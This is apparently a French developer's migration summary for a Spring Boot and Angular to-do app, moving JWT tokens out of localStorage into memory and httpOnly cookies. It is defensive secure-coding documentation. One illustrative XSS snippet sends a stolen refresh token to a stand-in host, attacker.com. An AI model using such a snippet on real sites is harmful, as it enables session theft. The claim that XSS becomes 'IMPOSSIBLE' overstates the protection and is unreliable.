# 🔐 Migration JWT Sécurisée - Résumé des Changements

## ✅ Migration Complétée

**Date** : 12 avril 2026  
**Objectif** : Sécuriser le stockage des tokens JWT contre les attaques XSS

---

## 📋 Fichiers Modifiés

### **Backend (Spring Boot)** ☕

#### 1. AuthController.java
**Localisation** : `todoapp_spring_boot/src/main/java/com/kanban/kanbanapp/controller/AuthController.java`

**Changements** :
- ✅ Ajout imports : `ResponseCookie`, `HttpHeaders`, `Cookie`, `HttpServletRequest`, `HttpServletResponse`
- ✅ `login()` : Envoie refreshToken en httpOnly cookie
- ✅ `register()` : Envoie refreshToken en httpOnly cookie
- ✅ `refresh()` : Lit refreshToken depuis cookie, retourne nouveau en cookie

**Code clé** :
```java
ResponseCookie refreshTokenCookie = ResponseCookie.from("refreshToken", token)
    .httpOnly(true)      // ✅ Protection XSS
    .secure(false)       // ⚠️ TODO: true en PRODUCTION
    .sameSite("Lax")     // ✅ Protection CSRF
    .path("/auth")
    .maxAge(7 * 24 * 60 * 60)
    .build();

response.addHeader(HttpHeaders.SET_COOKIE, refreshTokenCookie.toString());
```

---

### **Frontend (Angular)** 🅰️

#### 1. token.service.ts ✨ **NOUVEAU**
**Localisation** : `TodoApp_Angular/src/app/services/authentication/token.service.ts`

**Rôle** :
- 🔒 Stockage de l'accessToken **en MÉMOIRE** (variable privée)
- 📊 Observable pour l'état d'authentification
- 💾 Gestion des données utilisateur (non sensibles)
- 🗑️ Méthodes de nettoyage

**API** :
```typescript
setAccessToken(token: string): void
getAccessToken(): string | null
clearAccessToken(): void
setUserData(data): void
getUserData(): object | null
getUserId(): string | null
clearAll(): void
isAuthenticated(): boolean
isAuthenticated$: Observable<boolean>
```

---

#### 2. auth.interceptors.ts
**Localisation** : `TodoApp_Angular/src/app/interceptors/auth.interceptors.ts`

**Changements** :
- ✅ Injection de `TokenService`
- ✅ Utilise `tokenService.getAccessToken()` au lieu de `localStorage.getItem()`
- ✅ Ajout de `withCredentials: true` sur **toutes** les requêtes
- ✅ Sauvegarde du nouveau token via `tokenService.setAccessToken()`
- ✅ Nettoyage via `tokenService.clearAll()`
- ✅ Suppression de la lecture de `refreshToken` depuis localStorage

**Avant** :
```typescript
const token = localStorage.getItem('accessToken');
localStorage.setItem('accessToken', newToken);
```

**Après** :
```typescript
const token = tokenService.getAccessToken();
tokenService.setAccessToken(newToken);
```

---

#### 3. auth-service.ts
**Localisation** : `TodoApp_Angular/src/app/services/authentication/auth-service.ts`

**Changements** :
- ✅ Injection de `TokenService`
- ✅ `ensureAuthenticated()` : Utilise `tokenService` au lieu de `localStorage`
- ✅ `refreshAccessToken()` : Body vide + `withCredentials: true`
- ✅ `addUser()` et `getUserByEmailAndPassword()` : Ajout `withCredentials: true`
- ✅ Suppression de la méthode `testRefreshToken()` (obsolète)

**Avant** :
```typescript
return this.http.post(`${apiUrl}/auth/refresh`, { refreshToken });
```

**Après** :
```typescript
return this.http.post(`${apiUrl}/auth/refresh`, {}, { 
  withCredentials: true  // Cookie envoyé automatiquement
});
```

---

#### 4. sign-in.ts
**Localisation** : `TodoApp_Angular/src/app/components/sign-in/sign-in.ts`

**Changements** :
- ✅ Injection de `TokenService`
- ✅ Utilise `tokenService.setAccessToken()` au lieu de `localStorage`
- ✅ Utilise `tokenService.setUserData()` pour les infos non sensibles
- ✅ Interface `AuthResponse` : `refreshToken` peut être `null`

**Avant** :
```typescript
localStorage.setItem('accessToken', authData.accessToken);
localStorage.setItem('refreshToken', authData.refreshToken);
localStorage.setItem('User-Id', authData.userId);
// ...
```

**Après** :
```typescript
this.tokenService.setAccessToken(authData.accessToken);
this.tokenService.setUserData({
  userId: authData.userId,
  username: authData.username,
  email: authData.email,
  role: authData.role
});
```

---

## 🔐 Architecture de Sécurité

### **Stockage des Tokens**

| Token | Avant | Après | Sécurité |
|-------|-------|-------|----------|
| **accessToken** | localStorage | **Mémoire** (variable) | ⚠️ → ✅ Perdu au refresh de page |
| **refreshToken** | localStorage | **httpOnly Cookie** | ❌ → ✅ Inaccessible en JavaScript |

### **Protection Contre XSS**

**AVANT** ❌
```javascript
// Attaque XSS possible
<script>
  const token = localStorage.getItem('refreshToken');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
</script>
```

**APRÈS** ✅
```javascript
// Attaque XSS IMPOSSIBLE
<script>
  const token = localStorage.getItem('refreshToken');
  // → null ✅
  
  const cookie = document.cookie;
  // → refreshToken n'apparaît PAS (httpOnly) ✅
</script>
```

---

## 🎯 Flux de Données

### **1. Login**
```
User → Angular → POST /auth/login → Spring Boot
                                      ↓
                        [Génère accessToken + refreshToken]
                                      ↓
                        [Envoie refreshToken en Cookie httpOnly]
                                      ↓
Angular ← { accessToken, userId, ... } ← Spring Boot
   ↓
[TokenService.setAccessToken(token)]  // Mémoire ✅
[Set-Cookie: refreshToken=...]         // Cookie ✅
```

### **2. Requête API**
```
Angular → GET /api/boards
   ↓
[Interceptor ajoute: Authorization: Bearer {accessToken}]
   ↓
Spring Boot → JwtAuthenticationFilter
   ↓
[Valide accessToken]
   ↓
200 OK { boards: [...] }
```

### **3. Refresh Automatique (token expiré)**
```
Angular → GET /api/boards
   ↓
401 Unauthorized (token expired)
   ↓
[Interceptor détecte 401]
   ↓
Angular → POST /auth/refresh (Cookie: refreshToken=...)
   ↓
Spring Boot → [Lit cookie + rotate token]
   ↓
Angular ← { accessToken, ... } + Set-Cookie: refreshToken=...
   ↓
[TokenService.setAccessToken(newToken)]
   ↓
Angular → Retry GET /api/boards (Authorization: Bearer {newToken})
   ↓
200 OK ✅
```

---

## 🧪 Tests à Effectuer

### ✅ Checklist de Validation

- [ ] **Login** : Cookie `refreshToken` visible dans DevTools (HttpOnly ✓)
- [ ] **Login** : localStorage ne contient **PAS** `accessToken` ni `refreshToken`
- [ ] **Login** : Console affiche "🔐 AccessToken stocké en MÉMOIRE"
- [ ] **Login** : Console affiche "🍪 RefreshToken stocké en httpOnly cookie"
- [ ] **Navigation** : L'utilisateur reste connecté en naviguant
- [ ] **Refresh Page** : Au premier 401, refresh automatique fonctionne
- [ ] **Refresh Token** : Nouveau cookie reçu après refresh
- [ ] **Sécurité** : `localStorage.getItem('refreshToken')` retourne `null`
- [ ] **Sécurité** : `document.cookie` ne contient PAS le refreshToken

---

## ⚠️ Points d'Attention

### **1. Rafraîchissement de Page**
- L'`accessToken` est **perdu** au F5
- **Solution automatique** : L'intercepteur détecte le 401 et appelle `/auth/refresh`
- Le cookie `refreshToken` persiste (7 jours)

### **2. Production (HTTPS)**
À modifier dans `AuthController.java` :
```java
.secure(true)  // ⚠️ À activer en PRODUCTION
```

### **3. Domaines Cross-Origin**
Si frontend et backend sur domaines différents :
- Vérifier `cors.allowed-origins` dans `application.properties`
- Ajouter `.domain(".example.com")` sur le cookie

---

## 📊 Comparaison de Sécurité

| Critère | Avant | Après |
|---------|-------|-------|
| **XSS sur refreshToken** | ❌ Vulnérable | ✅ Protégé (httpOnly) |
| **XSS sur accessToken** | ❌ Vulnérable | ⚠️ Limité (mémoire, courte durée) |
| **CSRF** | ⚠️ Possible | ✅ Protégé (sameSite=Lax) |
| **Token Reuse** | ✅ Détecté | ✅ Détecté |
| **Token Rotation** | ✅ Implémenté | ✅ Implémenté |
| **Session Persistence** | ✅ Oui | ⚠️ Requiert refresh initial |

---

## 🔄 Rollback (si nécessaire)

Pour revenir à l'ancienne version :

1. **Backend** : Utiliser `git revert` sur `AuthController.java`
2. **Frontend** :
   - Supprimer `token.service.ts`
   - Restaurer les versions précédentes de :
     - `auth.interceptors.ts`
     - `auth-service.ts`
     - `sign-in.ts`

---

## 📚 Documentation Associée

- [MIGRATION_SECURISATION_JWT.md](./MIGRATION_SECURISATION_JWT.md) - Guide complet
- [JWT_FLOW_ANALYSIS.md](./JWT_FLOW_ANALYSIS.md) - Analyse du flow JWT

---

**Migration réussie ! 🎉**

L'application est maintenant **beaucoup plus sécurisée** contre les attaques XSS.
